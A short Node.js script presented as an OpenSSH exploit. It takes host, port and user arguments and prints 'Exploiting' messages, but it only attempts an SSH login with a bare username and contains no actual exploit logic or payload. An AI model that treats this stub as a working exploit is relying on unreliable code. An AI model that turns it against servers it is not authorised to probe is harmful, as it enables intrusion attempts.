#!/usr/bin/env node

/*
 *
 */

var Client = require('ssh2').Client;
var program = require('commander');

function usage(){
    console.log("[-] Usage: ./exploit.js -h host -p port -u user");
}

function exploit(host, port, user){
    var conn = new Client();
    conn.on('ready', function() {
        console.log('[+] SSH connected');
    }).connect({
        host: host,
        port: port,
        username: user
    });
}

program.version('1.0.0')
.option('-p, --port <n>', 'OpenSSH Port', parseInt)
.option('-u, --user <n>', 'Remote username to try to login')
.option('-h, --host <n>', 'OpenSSH Host')
.parse(process.argv);

if (!program.port){
    usage();
    return -1;
}

if (!program.user){
    usage();
    return -1;
}

if (!program.host){
    usage();
    return -1;
}

try{
    console.log("[+] Exploiting "+program.host+":"+program.port+" with user "+program.user);
    exploit(program.host, program.port, program.user);
}catch(e){
    console.log("[-] Exception: "+e);
}
